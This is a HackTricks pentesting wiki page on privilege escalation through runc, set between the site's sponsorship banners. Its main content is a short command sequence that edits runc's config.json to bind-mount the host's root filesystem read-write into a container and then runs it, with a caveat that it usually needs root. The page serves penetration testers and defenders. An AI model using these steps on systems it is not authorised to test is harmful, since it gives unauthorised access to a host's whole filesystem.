<details> <summary><strong>Support HackTricks and get benefits!</strong></summary> Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)! Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family) Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.** **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.** </details>
# RunC Privilege Escalation

## Basic information

If you want to learn more about **runc** check the following page:

{% content-ref url="../../pentesting/2375-pentesting-docker.md" %}
[2375-pentesting-docker.md](../../pentesting/2375-pentesting-docker.md)
{% endcontent-ref %}

## PE

If you find that `runc` is installed in the host you may be able to **run a container mounting the root / folder of the host**.

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

{% hint style="danger" %}
This won't always work as the default operation of runc is to run as root, so running it as an unprivileged user simply cannot work (unless you have a rootless configuration). Making a rootless configuration the default isn't generally a good idea because there are quite a few restrictions inside rootless containers that don't apply outside rootless containers.
{% endhint %}



<details> <summary><strong>Support HackTricks and get benefits!</strong></summary> Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)! Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family) Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.** **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.** </details>
